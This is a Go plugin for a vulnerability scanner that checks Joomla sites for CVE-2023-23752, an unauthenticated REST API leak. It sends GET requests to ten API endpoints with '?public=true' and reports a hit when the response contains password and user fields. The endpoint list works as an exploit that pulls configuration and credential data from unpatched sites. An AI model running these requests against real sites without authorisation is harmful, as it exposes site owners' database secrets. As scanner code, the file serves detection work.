// goplugin/plugin2.go
package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
	"sync"
)

func init() {
	Register("joomla_unauth_cve_2023_23752", &joomla_unauth_cve_2023_23752{})
}

type joomla_unauth_cve_2023_23752 struct{}

func (p *joomla_unauth_cve_2023_23752) Info() PluginInfo {
	return PluginInfo{
		Name:     "Joomla未授权漏洞（CVE-2023-23752）",
		VulnInfo: "Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统。CVE-2023-23752 中，由于鉴权存在错误，导致攻击者可构造恶意请求未授权访问RestAPI 接口，造成敏感信息泄漏，获取Joomla相关配置信息。",
		VulnID:   "CVE-2023-23752",
		Level:    "5.3 MEDIUM",
		URL:      "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23752",
		Version:  "4.0.0 <= Joomla! <= 4.2.7",
		CWE:      "CWE-285	授权机制不恰当",
	}
}

func (p *joomla_unauth_cve_2023_23752) Check(netloc string) bool {
	paths := []string{
		"/api/index.php/v1/config/application?public=true",
		"/api/index.php/v1/banners?public=true",
		"/api/index.php/v1/banners/clients?public=true",
		"/api/index.php/v1/banners/categories?public=true",
		"/api/index.php/v1/contacts?public=true",
		"/api/index.php/v1/contacts/categories?public=true",
		"/api/index.php/v1/fields/contacts/contact?public=true",
		"/api/index.php/v1/fields/contacts/mail?public=true",
		"/api/index.php/v1/fields/contacts/categories?public=true",
		"/api/index.php/v1/fields/groups/contacts/contact?public=true",
	}

	var wg sync.WaitGroup
	resultChan := make(chan bool, len(paths))

	for _, path := range paths {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()

			url := netloc + p
			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				return
			}

			resp, err := utils.RequestDo(req, true, 1)
			if err != nil {
				return
			}

			if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "links") &&
				strings.Contains(resp.ResponseRaw, "password") && strings.Contains(resp.ResponseRaw, "attributes") &&
				strings.Contains(resp.ResponseRaw, "user") {
				resultChan <- true
			}
		}(path)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for result := range resultChan {
		if result {
			return true
		}
	}

	return false
}
